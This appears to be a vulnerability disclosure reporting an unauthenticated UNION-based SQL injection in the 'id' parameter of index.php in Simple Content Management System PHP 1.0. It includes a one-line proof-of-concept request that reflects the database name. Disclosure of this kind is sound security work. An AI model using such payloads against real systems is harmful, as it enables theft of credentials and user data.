# SQL Injection via id Parameter in index.php - Simple Content Management System in PHP

## Description
A SQL Injection vulnerability exists in Simple Content Management 
System PHP. The `id` parameter in `index.php` is not sanitized 
before being passed to the SQL query, allowing an unauthenticated 
attacker to extract sensitive data from the database including 
database names, tables, and credentials.

---

## Vulnerability Details
- **Type:** SQL Injection (CWE-89)
- **Impact:** Information Disclosure / Database Dump
- **Affected File:** `/web/index.php`
- **Affected Parameter:** `id`
- **Attack Vector:** Remote, Unauthenticated

---

## Vendor
code-projects.org

## Product
Simple Content Management System PHP

## Version
1.0

---

## Proof of Concept (PoC)

### Payload:
GET /web/index.php?id=1 UNION SELECT 1,database(),3-- - HTTP/1.1
Host: [target]
<img width="1920" height="1080" alt="Screenshot 2026-04-05 051727" src="https://github.com/user-attachments/assets/5fb261e8-ad72-4abd-9808-5926017fc10c" />


### Result:
Database name is reflected on the page confirming SQL Injection.

<img width="1920" height="1080" alt="Screenshot 2026-04-05 051717" src="https://github.com/user-attachments/assets/bd3d881b-f511-4d16-a7cd-8d7bb6f3d536" />


---

## Impact
An unauthenticated remote attacker can extract the entire database 
including credentials, user data, and all stored content using 
UNION-based SQL injection via the id parameter.

---

## Author
Imad Alvi

---

## Reference
https://code-projects.org/simple-content-management-system-in-php-with-source-code/
